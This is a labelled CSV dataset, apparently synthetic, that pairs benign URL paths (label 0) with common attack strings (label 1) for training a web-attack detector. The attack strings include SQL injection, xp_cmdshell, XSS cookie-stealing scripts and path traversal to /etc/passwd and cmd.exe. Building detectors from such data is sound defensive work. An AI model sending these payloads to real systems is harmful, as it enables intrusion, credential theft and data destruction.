payload,label
/api/users?sort=asc15,0
/checkout?page=2496,0
/?id=1; DROP TABLE users,1
/index.html?sort=asc679,0
/onload=prompt(1),1
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/index.html?category=tech950,0
/api/users?id=1536,0
/dashboard?id=1217,0
/products/item,0
/about?id=1866,0
/login?user=urmit41,0
/api/users?sort=asc593,0
/contact?page=2700,0
/about?page=2180,0
/contact?user=urmit506,0
/contact?page=238,0
/about?page=2264,0
/<script>alert(document.cookie)</script>,1
/dashboard?sort=asc623,0
/about?category=tech26,0
/products/item?sort=asc481,0
/index.html?search=' OR '1'='1,1
/about?sort=asc657,0
/dashboard,0
/api/users,0
/dashboard?sort=asc166,0
/api/users?category=tech115,0
/checkout?sort=asc252,0
/about?sort=asc68,0
/onload=prompt(1),1
/login?sort=asc556,0
/products/item?category=tech32,0
/products/item,0
/contact?page=2114,0
/login?user=urmit969,0
/dashboard?sort=asc775,0
/'; EXEC xp_cmdshell('dir');--,1
/products/item,0
/dashboard,0
/checkout?id=1185,0
/'; EXEC xp_cmdshell('dir');--,1
/api/users?sort=asc178,0
/index.html?category=tech583,0
/products/item,0
/products/item?sort=asc897,0
/checkout?page=264,0
/products/item?category=tech474,0
/login?user=urmit678,0
/dashboard?page=2246,0
/../../../../etc/passwd,1
/contact?search=<script>alert(document.cookie)</script>,1
/login?category=tech559,0
/products/item?sort=asc62,0
/checkout,0
/products/item?search=' OR '1'='1,1
/about?category=tech278,0
/index.html?category=tech451,0
/contact?page=2175,0
/products/item?category=tech795,0
/dashboard?sort=asc700,0
/login,0
/api/users?user=urmit352,0
/index.html?sort=asc746,0
/api/users?user=urmit102,0
/dashboard?page=2534,0
/login,0
/about?page=2161,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/dashboard?user=urmit944,0
/login?page=2557,0
/api/users?id=1664,0
/checkout?sort=asc32,0
/login?search='; EXEC xp_cmdshell('dir');--,1
/index.html?user=urmit41,0
/products/item?id=1926,0
/dashboard?sort=asc330,0
/products/item?page=2462,0
/checkout,0
/dashboard?page=2434,0
/dashboard,0
/api/users?id=1730,0
/about?search=../../../../etc/passwd,1
/checkout?search=admin' --,1
/contact?page=2349,0
/contact,0
/checkout?sort=asc316,0
/login?page=2712,0
/login?sort=asc617,0
/login,0
/contact,0
/about?user=urmit735,0
/index.html?id=1516,0
/api/users,0
/checkout?user=urmit368,0
/' OR '1'='1,1
/products/item?page=2721,0
/index.html?user=urmit334,0
/contact?user=urmit962,0
/checkout?id=1697,0
/index.html,0
/index.html?category=tech136,0
/index.html,0
/checkout?category=tech748,0
/about,0
/about?id=1681,0
/products/item?user=urmit694,0
/about?category=tech913,0
/index.html?id=1386,0
/'; EXEC xp_cmdshell('dir');--,1
/about,0
"/checkout?search=UNION SELECT username, password FROM users",1
/dashboard?user=urmit755,0
/products/item?user=urmit461,0
/checkout,0
/about?id=190,0
/products/item?search='; EXEC xp_cmdshell('dir');--,1
/api/users,0
/login?page=2470,0
/login?page=2660,0
/contact?search=javascript:eval('var a=1'),1
/../../../windows/system32/cmd.exe,1
/dashboard?page=2349,0
/dashboard?sort=asc250,0
/login?page=2746,0
/login?sort=asc538,0
/login,0
/login?search=' OR '1'='1,1
/api/users?search=admin' --,1
/contact?user=urmit620,0
/checkout?sort=asc688,0
"/login?search=UNION SELECT username, password FROM users",1
/contact?id=1544,0
/dashboard?user=urmit927,0
/javascript:eval('var a=1'),1
/index.html?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/login,0
/api/users?id=1331,0
/api/users?user=urmit533,0
"/login?search="" OR 1=1 --",1
/checkout,0
/api/users?search=' OR '1'='1,1
/checkout,0
/dashboard?category=tech350,0
/index.html?sort=asc675,0
/login,0
/login?page=21,0
/api/users?user=urmit356,0
/contact?search=?id=1; DROP TABLE users,1
/login?category=tech515,0
/products/item?sort=asc654,0
/about?sort=asc597,0
/products/item?category=tech895,0
/index.html,0
/about?user=urmit408,0
/login?page=2894,0
/login?sort=asc618,0
/index.html?category=tech152,0
/login?user=urmit875,0
/dashboard,0
/dashboard?search=<script>alert(document.cookie)</script>,1
/login?sort=asc934,0
/checkout?page=2379,0
/api/users,0
"/api/users?search=UNION SELECT username, password FROM users",1
/about?id=1131,0
/login?category=tech300,0
/login?user=urmit744,0
/login?sort=asc837,0
/checkout?user=urmit507,0
/dashboard?category=tech82,0
/checkout?page=2946,0
/dashboard,0
/products/item?user=urmit130,0
/checkout?sort=asc230,0
/login?id=196,0
/checkout?search=?id=1; DROP TABLE users,1
/contact?search=<script>alert(document.cookie)</script>,1
/dashboard?page=2836,0
/products/item,0
/'; EXEC xp_cmdshell('dir');--,1
/products/item?user=urmit869,0
"/contact?search="" OR 1=1 --",1
/dashboard?category=tech600,0
/products/item?id=1445,0
/checkout,0
/api/users?page=2309,0
/contact?sort=asc292,0
/api/users?page=2880,0
/dashboard?id=1896,0
/products/item?category=tech490,0
/about?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
"/about?search="" OR 1=1 --",1
/contact?sort=asc591,0
/../../../../etc/passwd,1
/dashboard?sort=asc273,0
/login?sort=asc7,0
/products/item?category=tech681,0
/dashboard,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/dashboard?sort=asc790,0
/login?user=urmit720,0
/dashboard?sort=asc63,0
/products/item?search='; EXEC xp_cmdshell('dir');--,1
/contact?page=2526,0
/index.html?page=2546,0
/login?id=1959,0
/products/item?user=urmit318,0
/index.html?id=1272,0
/index.html,0
/dashboard?user=urmit359,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/products/item?id=1406,0
/dashboard?user=urmit586,0
/checkout,0
/../../../../etc/passwd,1
/about,0
/products/item?page=2563,0
/login?id=1418,0
/contact,0
/?id=1; DROP TABLE users,1
/checkout?user=urmit276,0
/login?user=urmit86,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/dashboard?page=2840,0
/about?search=?id=1; DROP TABLE users,1
/about?sort=asc670,0
/index.html?user=urmit725,0
/checkout,0
/checkout?user=urmit562,0
/about?category=tech878,0
/index.html?id=1108,0
/login?search=../../../../etc/passwd,1
/contact?id=178,0
/products/item?sort=asc864,0
/contact?category=tech46,0
/api/users,0
/dashboard?id=1376,0
/api/users?category=tech187,0
/contact?search=../../../../etc/passwd,1
/dashboard?sort=asc730,0
/checkout?sort=asc684,0
/index.html?sort=asc594,0
/products/item?search=../../../../etc/passwd,1
/login?user=urmit515,0
/products/item?page=2533,0
"/contact?search="" OR 1=1 --",1
/contact?id=1969,0
/checkout?category=tech305,0
/index.html?page=2571,0
/login?page=2849,0
/index.html?user=urmit887,0
/products/item?category=tech528,0
/api/users?search=javascript:eval('var a=1'),1
/<script>alert(document.cookie)</script>,1
/contact?page=2821,0
/checkout?search=<script>alert(document.cookie)</script>,1
/contact?user=urmit544,0
/checkout,0
/dashboard?user=urmit152,0
/../../../../etc/passwd,1
/checkout?sort=asc527,0
/api/users?sort=asc587,0
/dashboard?category=tech76,0
/about?user=urmit975,0
/about?id=1205,0
/checkout?search=javascript:eval('var a=1'),1
/index.html?sort=asc647,0
/dashboard?user=urmit28,0
/checkout,0
/products/item?user=urmit165,0
/checkout?category=tech371,0
/index.html?user=urmit474,0
"/products/item?search=UNION SELECT username, password FROM users",1
/index.html?id=1736,0
/checkout?id=1986,0
/about?search=?id=1; DROP TABLE users,1
/products/item?category=tech24,0
/contact?user=urmit435,0
/contact?page=2543,0
/checkout,0
/dashboard?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/dashboard,0
"/api/users?search=UNION SELECT username, password FROM users",1
/about?id=160,0
/api/users?id=1122,0
/api/users,0
/checkout?sort=asc432,0
/about?category=tech549,0
/checkout?user=urmit592,0
/contact?sort=asc700,0
/login?sort=asc597,0
/dashboard,0
/checkout?sort=asc293,0
/about?search=?id=1; DROP TABLE users,1
/dashboard?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/about?page=213,0
/contact?sort=asc248,0
/about?category=tech177,0
/dashboard?sort=asc474,0
/dashboard,0
/contact?page=2158,0
/login?sort=asc930,0
/dashboard?category=tech290,0
/about?id=1710,0
/about?id=1416,0
/about?user=urmit78,0
/products/item?page=2862,0
/dashboard?user=urmit763,0
/dashboard?page=2531,0
"/UNION SELECT username, password FROM users",1
/index.html?user=urmit351,0
/contact?user=urmit486,0
/dashboard?user=urmit268,0
/onload=prompt(1),1
/dashboard?sort=asc706,0
/checkout?sort=asc99,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/api/users?search=../../../windows/system32/cmd.exe,1
/index.html?sort=asc826,0
/dashboard?id=1271,0
/contact?page=2808,0
/index.html?category=tech144,0
/login?page=2671,0
/checkout?category=tech69,0
/checkout?page=2759,0
/products/item?category=tech476,0
/contact?user=urmit872,0
/products/item?sort=asc569,0
/dashboard?id=1936,0
/index.html?sort=asc996,0
/api/users,0
/../../../windows/system32/cmd.exe,1
/products/item?id=1917,0
/about?user=urmit88,0
/index.html?category=tech208,0
/products/item?search=../../../../etc/passwd,1
/checkout?category=tech866,0
/about?page=2186,0
/index.html?id=1843,0
/api/users?id=1969,0
/index.html?id=1826,0
/about,0
/dashboard?user=urmit9,0
/about,0
/about?user=urmit908,0
/about?page=2328,0
/about?page=2507,0
/about?category=tech473,0
/dashboard?page=2345,0
/checkout?category=tech147,0
/contact?user=urmit831,0
/about?sort=asc827,0
/about?id=1270,0
/<script>alert(document.cookie)</script>,1
/dashboard?sort=asc3,0
/login?category=tech108,0
/admin' --,1
/dashboard?page=2829,0
/api/users?page=2201,0
/contact?page=221,0
/products/item?user=urmit153,0
/api/users?user=urmit498,0
/contact,0
/about?page=2723,0
/contact?user=urmit751,0
/api/users,0
/dashboard?id=1760,0
/products/item?page=2248,0
/api/users?id=1778,0
/dashboard?user=urmit129,0
/api/users?page=2693,0
/products/item?category=tech825,0
/products/item?category=tech40,0
/contact?sort=asc624,0
/products/item,0
/dashboard,0
/about?user=urmit190,0
/about?id=1198,0
/dashboard,0
/about?id=1304,0
/about?page=2338,0
/about?category=tech802,0
/contact?sort=asc219,0
/index.html?page=2559,0
/dashboard?id=1578,0
/api/users?page=2330,0
/about?id=1764,0
/api/users?page=2765,0
/onload=prompt(1),1
/api/users,0
/login?category=tech83,0
/about?user=urmit645,0
/contact?sort=asc253,0
/contact?page=2354,0
/api/users?page=2359,0
/dashboard?page=285,0
/checkout,0
/contact?id=1396,0
/dashboard?id=1425,0
/login?sort=asc407,0
/login?page=2265,0
/contact?category=tech316,0
/about?category=tech950,0
/contact?sort=asc36,0
/checkout,0
/contact?sort=asc986,0
/checkout?search=../../../windows/system32/cmd.exe,1
/api/users?page=2609,0
/contact?search='; EXEC xp_cmdshell('dir');--,1
/?id=1; DROP TABLE users,1
/login?user=urmit196,0
/products/item?id=1171,0
"/about?search=UNION SELECT username, password FROM users",1
/dashboard,0
/products/item?page=2538,0
/api/users,0
/contact,0
/login,0
/checkout?sort=asc554,0
/contact?id=17,0
/products/item?id=1928,0
/dashboard,0
/about?id=1222,0
/login,0
/admin' --,1
/api/users?sort=asc860,0
/products/item?category=tech517,0
/contact,0
/contact?page=2176,0
/about?id=1937,0
/index.html,0
/../../../windows/system32/cmd.exe,1
/api/users,0
/index.html?search=../../../windows/system32/cmd.exe,1
/api/users?search=' OR '1'='1,1
/../../../windows/system32/cmd.exe,1
/api/users?sort=asc768,0
/api/users?sort=asc588,0
/login,0
/login?sort=asc755,0
/checkout?page=2416,0
/contact?search=?id=1; DROP TABLE users,1
/api/users?search=javascript:eval('var a=1'),1
/checkout?id=1130,0
/about?page=2796,0
/dashboard,0
/login?search=' OR '1'='1,1
/dashboard?page=2387,0
/dashboard?user=urmit595,0
/products/item?page=2574,0
/index.html?search=javascript:eval('var a=1'),1
/dashboard?page=224,0
"/UNION SELECT username, password FROM users",1
/index.html?id=1953,0
/dashboard?page=2865,0
/index.html?user=urmit864,0
/index.html?id=1274,0
/api/users?sort=asc100,0
/api/users?user=urmit556,0
/contact?user=urmit448,0
/checkout?sort=asc106,0
/login?id=1910,0
/index.html?user=urmit707,0
/dashboard?sort=asc420,0
/products/item?page=2124,0
/api/users?sort=asc778,0
/dashboard?page=2237,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/api/users?id=111,0
/checkout?user=urmit407,0
/login?search=' OR '1'='1,1
/dashboard?search='; EXEC xp_cmdshell('dir');--,1
/products/item?page=2861,0
/<script>alert(document.cookie)</script>,1
"/UNION SELECT username, password FROM users",1
"/contact?search=UNION SELECT username, password FROM users",1
/dashboard?user=urmit202,0
/dashboard?page=2867,0
/products/item?search=' OR '1'='1,1
/login?sort=asc228,0
/api/users?user=urmit993,0
/login?user=urmit648,0
/dashboard?page=2248,0
/checkout?page=2198,0
/index.html?page=2678,0
/products/item?user=urmit691,0
/products/item?user=urmit423,0
/contact?page=262,0
/index.html?user=urmit172,0
/api/users?id=1307,0
/login?id=1604,0
/about?sort=asc257,0
/about?category=tech283,0
/about?id=1310,0
/checkout?id=1904,0
/about?id=1350,0
/login,0
/checkout?category=tech237,0
/products/item?page=281,0
/login?page=2958,0
/api/users?id=1145,0
/contact?category=tech486,0
/index.html?id=1296,0
"/"" OR 1=1 --",1
/api/users?category=tech294,0
/about?search=onload=prompt(1),1
/contact?user=urmit151,0
/about?page=2754,0
/about?id=1997,0
/checkout?page=2177,0
/login?search=../../../../etc/passwd,1
/checkout?page=2251,0
/dashboard?sort=asc623,0
/contact?search=../../../../etc/passwd,1
/about?user=urmit893,0
/login?page=2402,0
/api/users?page=2106,0
/index.html?category=tech1,0
/products/item?page=2168,0
/dashboard,0
/api/users?category=tech182,0
/about,0
/api/users?user=urmit665,0
/api/users?search=?id=1; DROP TABLE users,1
/about?page=2652,0
/api/users?search=javascript:eval('var a=1'),1
/login?id=171,0
/dashboard,0
/index.html?user=urmit2,0
/api/users?search=javascript:eval('var a=1'),1
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/about?user=urmit502,0
/checkout?page=2994,0
/checkout,0
/dashboard?category=tech803,0
/dashboard?page=2564,0
/contact,0
/admin' --,1
/index.html?sort=asc968,0
/checkout?category=tech829,0
/login?search='; EXEC xp_cmdshell('dir');--,1
/contact?search=<script>alert(document.cookie)</script>,1
/api/users?search=admin' --,1
"/"" OR 1=1 --",1
/api/users?id=1918,0
/contact?sort=asc41,0
/contact?category=tech527,0
/api/users?user=urmit515,0
/login?user=urmit233,0
/login?search='; EXEC xp_cmdshell('dir');--,1
/api/users?id=1848,0
/api/users?sort=asc608,0
/login,0
"/"" OR 1=1 --",1
/about?user=urmit95,0
/index.html?sort=asc859,0
/products/item?id=1173,0
/../../../../etc/passwd,1
/about?id=1974,0
/contact?user=urmit369,0
/products/item?page=281,0
/contact?page=2223,0
/index.html?id=1864,0
/api/users?page=2823,0
/checkout,0
/products/item?user=urmit345,0
/<script>alert(document.cookie)</script>,1
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?id=144,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/about?sort=asc136,0
/products/item?page=2759,0
/index.html?category=tech995,0
/checkout,0
/api/users?user=urmit576,0
/products/item?page=261,0
/dashboard?user=urmit279,0
/login?category=tech741,0
/'; EXEC xp_cmdshell('dir');--,1
/../../../../etc/passwd,1
/products/item?id=1716,0
/dashboard?search=../../../windows/system32/cmd.exe,1
/api/users?search=onload=prompt(1),1
/login,0
/api/users?user=urmit107,0
/products/item?id=1402,0
/index.html?sort=asc501,0
/about?page=2789,0
/dashboard?category=tech995,0
/dashboard?category=tech730,0
/checkout?search=javascript:eval('var a=1'),1
/about?page=2541,0
/checkout?user=urmit271,0
/about?page=2322,0
/admin' --,1
/dashboard?id=1639,0
/login?sort=asc765,0
/contact?page=2215,0
/dashboard,0
/api/users?category=tech292,0
/admin' --,1
/api/users?category=tech405,0
/api/users?search=?id=1; DROP TABLE users,1
/contact?category=tech664,0
/dashboard?id=141,0
/api/users?id=1558,0
/index.html?search=../../../windows/system32/cmd.exe,1
/about,0
/contact?category=tech510,0
/onload=prompt(1),1
/dashboard?sort=asc962,0
/checkout?id=1156,0
/checkout?search='; EXEC xp_cmdshell('dir');--,1
/about,0
/login?id=148,0
/onload=prompt(1),1
/api/users?id=1496,0
/products/item,0
/checkout?category=tech726,0
/dashboard?id=1262,0
/contact?id=198,0
/products/item?page=261,0
/dashboard?category=tech212,0
/api/users?search=../../../windows/system32/cmd.exe,1
/contact?page=2329,0
/checkout?category=tech108,0
"/api/users?search="" OR 1=1 --",1
/contact,0
/dashboard,0
/login?page=2435,0
/api/users?id=1827,0
/login?sort=asc92,0
/about?user=urmit799,0
/dashboard,0
/login,0
/about?category=tech802,0
/api/users?user=urmit790,0
/api/users?sort=asc517,0
/products/item?sort=asc232,0
/about?id=1503,0
/checkout?id=1391,0
/dashboard?id=1746,0
/checkout?page=2514,0
/products/item?search=../../../../etc/passwd,1
/checkout?sort=asc663,0
/contact?category=tech356,0
/contact?category=tech773,0
/contact?category=tech791,0
/contact?category=tech363,0
/api/users?id=1943,0
"/contact?search="" OR 1=1 --",1
/checkout?page=2558,0
/checkout?user=urmit575,0
/login?sort=asc846,0
/index.html?search=onload=prompt(1),1
/products/item?id=1887,0
/contact?id=12,0
/contact?user=urmit775,0
/products/item?sort=asc601,0
/about?sort=asc643,0
/index.html,0
/login?sort=asc618,0
/checkout,0
/about?search=../../../../etc/passwd,1
/products/item?page=2802,0
/api/users?id=1480,0
/checkout,0
/index.html?category=tech699,0
/dashboard?category=tech834,0
/login?category=tech572,0
/login?user=urmit784,0
/products/item?user=urmit802,0
/index.html?page=2928,0
"/products/item?search="" OR 1=1 --",1
/login?user=urmit899,0
/index.html?id=1807,0
/products/item,0
/contact?id=1216,0
/contact,0
/api/users?category=tech988,0
/api/users?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?id=1526,0
/checkout?page=2906,0
"/login?search=UNION SELECT username, password FROM users",1
/checkout?user=urmit74,0
/about?search=javascript:eval('var a=1'),1
/products/item?user=urmit892,0
/contact?category=tech930,0
/checkout?id=1120,0
/checkout?category=tech593,0
/about?page=2670,0
/products/item?category=tech601,0
/contact?sort=asc89,0
/index.html?user=urmit511,0
/products/item?user=urmit589,0
/contact?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?search=../../../../etc/passwd,1
/index.html,0
/products/item?id=1514,0
/login?id=1697,0
/contact?id=1643,0
/login?page=2537,0
/about?id=1144,0
/index.html?id=1346,0
/login?page=21,0
/'; EXEC xp_cmdshell('dir');--,1
/index.html?category=tech392,0
/checkout?user=urmit323,0
/contact?category=tech302,0
/dashboard?search=../../../windows/system32/cmd.exe,1
/products/item?sort=asc418,0
/dashboard?category=tech296,0
/index.html?sort=asc578,0
/products/item,0
"/about?search=UNION SELECT username, password FROM users",1
/index.html?id=1922,0
/checkout?search=?id=1; DROP TABLE users,1
/checkout?category=tech563,0
/index.html,0
/products/item?category=tech777,0
/products/item?user=urmit535,0
/contact,0
/dashboard?id=1762,0
/../../../windows/system32/cmd.exe,1
/checkout?user=urmit918,0
/' OR '1'='1,1
"/about?search="" OR 1=1 --",1
/checkout?category=tech784,0
/about?category=tech153,0
/login?search=?id=1; DROP TABLE users,1
/contact?user=urmit176,0
/about?sort=asc296,0
/checkout?page=2559,0
/contact?user=urmit740,0
"/"" OR 1=1 --",1
/dashboard?search=<script>alert(document.cookie)</script>,1
/?id=1; DROP TABLE users,1
/about?id=112,0
/checkout?id=1715,0
/products/item?search=<script>alert(document.cookie)</script>,1
/contact?page=2743,0
/contact?page=2195,0
/index.html?user=urmit414,0
/checkout?page=2807,0
/dashboard?category=tech746,0
/contact?category=tech810,0
/products/item?id=1212,0
/index.html?category=tech598,0
/api/users?category=tech599,0
/contact?id=1322,0
/checkout?category=tech924,0
/api/users?id=1961,0
/about?search=../../../windows/system32/cmd.exe,1
/products/item?id=1498,0
/index.html?page=2449,0
/checkout?sort=asc283,0
/api/users,0
/index.html?user=urmit983,0
/about?id=1145,0
/contact?category=tech926,0
/index.html?search=admin' --,1
/api/users?category=tech290,0
/admin' --,1
/api/users?page=2940,0
/products/item?page=2938,0
/checkout?page=2788,0
/api/users?sort=asc572,0
/onload=prompt(1),1
/products/item?search=admin' --,1
/dashboard?sort=asc115,0
/login?page=2110,0
/checkout,0
/index.html?page=2929,0
/dashboard?id=1140,0
/contact?user=urmit618,0
/about?page=286,0
/contact?id=1370,0
/dashboard?user=urmit710,0
/index.html?page=23,0
/contact?sort=asc308,0
/dashboard?sort=asc761,0
/index.html?sort=asc407,0
/login?category=tech837,0
/dashboard,0
/index.html?user=urmit690,0
/index.html?user=urmit124,0
/login?category=tech947,0
/dashboard?category=tech809,0
/products/item,0
/about?user=urmit772,0
/index.html?category=tech312,0
/checkout?category=tech711,0
/about?sort=asc491,0
/javascript:eval('var a=1'),1
/login?id=1798,0
/dashboard?category=tech733,0
/login?category=tech392,0
/checkout?id=1600,0
/login?page=2552,0
/about,0
/login?page=2441,0
/api/users?page=2210,0
/login?user=urmit983,0
/api/users?category=tech492,0
/about?sort=asc370,0
/checkout?category=tech896,0
/products/item?id=1160,0
/login?user=urmit203,0
/contact?user=urmit704,0
/login?sort=asc350,0
/about?category=tech857,0
/api/users,0
/products/item?user=urmit428,0
/about?category=tech191,0
/api/users?id=1715,0
/checkout?user=urmit833,0
/products/item?user=urmit217,0
/dashboard?category=tech595,0
/about?id=1690,0
"/checkout?search="" OR 1=1 --",1
/dashboard?id=1773,0
/checkout?sort=asc170,0
/dashboard?search='; EXEC xp_cmdshell('dir');--,1
/api/users?user=urmit817,0
/products/item?page=2106,0
/api/users?search=onload=prompt(1),1
"/contact?search="" OR 1=1 --",1
/login?search=?id=1; DROP TABLE users,1
/contact?category=tech290,0
/checkout?id=1244,0
/login?search=../../../windows/system32/cmd.exe,1
/products/item?id=1631,0
/api/users?category=tech724,0
/contact?search=../../../windows/system32/cmd.exe,1
/checkout?id=170,0
/about,0
/about?user=urmit340,0
/dashboard?search=<script>alert(document.cookie)</script>,1
/about,0
/checkout?page=2653,0
/api/users?sort=asc849,0
/checkout?sort=asc626,0
/api/users?page=2889,0
/dashboard?user=urmit830,0
/checkout?user=urmit595,0
/onload=prompt(1),1
/api/users?sort=asc223,0
/admin' --,1
/contact?user=urmit143,0
/dashboard?sort=asc285,0
/products/item?sort=asc323,0
/login?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/api/users?user=urmit783,0
/' OR '1'='1,1
/products/item?search=admin' --,1
/checkout?id=1603,0
/about?sort=asc974,0
/contact?page=2561,0
/login,0
/index.html?search=javascript:eval('var a=1'),1
/checkout?page=2260,0
/checkout?sort=asc837,0
/products/item?category=tech243,0
/onload=prompt(1),1
/contact?category=tech880,0
/contact,0
/login,0
/dashboard?id=1669,0
/checkout,0
/contact?category=tech475,0
/index.html?user=urmit406,0
/api/users?id=1326,0
/products/item?sort=asc65,0
/dashboard?id=1312,0
/index.html?search=../../../../etc/passwd,1
/checkout?page=2764,0
/checkout?user=urmit547,0
/about?sort=asc575,0
/api/users?category=tech299,0
/contact?id=1489,0
/dashboard?id=1207,0
/api/users?category=tech502,0
"/dashboard?search="" OR 1=1 --",1
/login?category=tech90,0
/api/users,0
"/checkout?search="" OR 1=1 --",1
/dashboard,0
/dashboard?page=2198,0
/products/item,0
/contact?user=urmit990,0
/dashboard?sort=asc733,0
/checkout?id=1577,0
/login?page=2787,0
/contact?user=urmit151,0
/contact?category=tech936,0
/checkout?category=tech71,0
/api/users,0
/dashboard?page=2113,0
/products/item?search=../../../../etc/passwd,1
/index.html,0
/dashboard,0
/contact,0
/index.html?sort=asc238,0
/contact?sort=asc439,0
/index.html?user=urmit433,0
/about?category=tech895,0
/contact?id=1154,0
/products/item?page=2461,0
/admin' --,1
/login?page=2844,0
/index.html?page=2614,0
/index.html?sort=asc768,0
/contact?category=tech111,0
/dashboard?page=2713,0
/checkout?user=urmit985,0
/login?category=tech33,0
/index.html?user=urmit83,0
/login,0
/index.html?id=1690,0
"/login?search=UNION SELECT username, password FROM users",1
/products/item?user=urmit748,0
/contact,0
/login?category=tech292,0
/products/item?category=tech553,0
/dashboard,0
/contact,0
/dashboard?page=2531,0
/api/users?page=2956,0
/dashboard?user=urmit147,0
/dashboard?category=tech263,0
/index.html?user=urmit630,0
/index.html?sort=asc256,0
/index.html?page=2623,0
/about?category=tech386,0
/checkout,0
/products/item?page=2469,0
/dashboard,0
/contact?sort=asc242,0
/about?sort=asc120,0
/products/item?user=urmit356,0
/about?page=240,0
/checkout?page=290,0
/about?category=tech459,0
/javascript:eval('var a=1'),1
/about?page=214,0
/about?category=tech767,0
/contact?category=tech274,0
/index.html?user=urmit399,0
/about?page=2337,0
/?id=1; DROP TABLE users,1
/../../../windows/system32/cmd.exe,1
/api/users?page=2405,0
"/api/users?search="" OR 1=1 --",1
/checkout,0
/products/item?page=2169,0
/products/item?id=1718,0
/dashboard?category=tech771,0
/dashboard?sort=asc256,0
/checkout?id=1838,0
/api/users?page=2646,0
/login?id=1329,0
/contact?sort=asc819,0
/checkout,0
/dashboard?page=2324,0
/checkout?sort=asc862,0
/login?search=admin' --,1
/dashboard?category=tech246,0
/login?user=urmit360,0
/api/users?page=2903,0
/products/item,0
/api/users?sort=asc137,0
/login?page=2954,0
/about?id=1105,0
/api/users?id=1209,0
/api/users?category=tech259,0
/'; EXEC xp_cmdshell('dir');--,1
/about,0
/dashboard?page=2331,0
/about?category=tech850,0
/<script>alert(document.cookie)</script>,1
/' OR '1'='1,1
/products/item?id=1738,0
/dashboard?search=javascript:eval('var a=1'),1
/about,0
/index.html,0
/dashboard?user=urmit651,0
/index.html?sort=asc564,0
/checkout?search=../../../../etc/passwd,1
/about,0
/about,0
/dashboard?user=urmit446,0
"/index.html?search=UNION SELECT username, password FROM users",1
/dashboard?page=2996,0
/login?category=tech830,0
/contact?sort=asc446,0
/products/item,0
/'; EXEC xp_cmdshell('dir');--,1
/contact?id=1850,0
/checkout?user=urmit650,0
/products/item?id=1437,0
/api/users?page=2244,0
/checkout?user=urmit722,0
/about?id=1353,0
/checkout?sort=asc778,0
/api/users?id=1272,0
/about?id=1360,0
"/dashboard?search=UNION SELECT username, password FROM users",1
/dashboard,0
/products/item?id=1916,0
/contact?id=1702,0
/checkout?user=urmit405,0
/contact?page=2375,0
/about?id=1894,0
/dashboard?id=1662,0
/checkout?sort=asc517,0
/api/users?sort=asc784,0
/api/users,0
/dashboard?id=1365,0
/dashboard?id=1603,0
/api/users,0
/dashboard?category=tech754,0
/checkout?sort=asc228,0
/about?user=urmit236,0
/products/item?id=1594,0
/admin' --,1
/onload=prompt(1),1
/dashboard?category=tech449,0
/contact?category=tech745,0
/<script>alert(document.cookie)</script>,1
/contact?category=tech426,0
/dashboard?id=1927,0
/dashboard?sort=asc958,0
/products/item?user=urmit102,0
/about?sort=asc993,0
/index.html?sort=asc135,0
/dashboard?id=1317,0
/contact,0
/products/item?user=urmit281,0
/index.html?sort=asc252,0
/about?page=2127,0
/dashboard?sort=asc18,0
/contact?category=tech218,0
/login?sort=asc650,0
/contact?category=tech950,0
/about?id=1593,0
/contact,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/index.html?category=tech113,0
/about?page=2482,0
/index.html?id=1190,0
/contact?page=255,0
/login?sort=asc667,0
/api/users?sort=asc533,0
/contact?id=1709,0
/about?user=urmit647,0
/onload=prompt(1),1
/dashboard?sort=asc763,0
/api/users?page=2364,0
/api/users?page=2709,0
"/UNION SELECT username, password FROM users",1
/index.html?id=1718,0
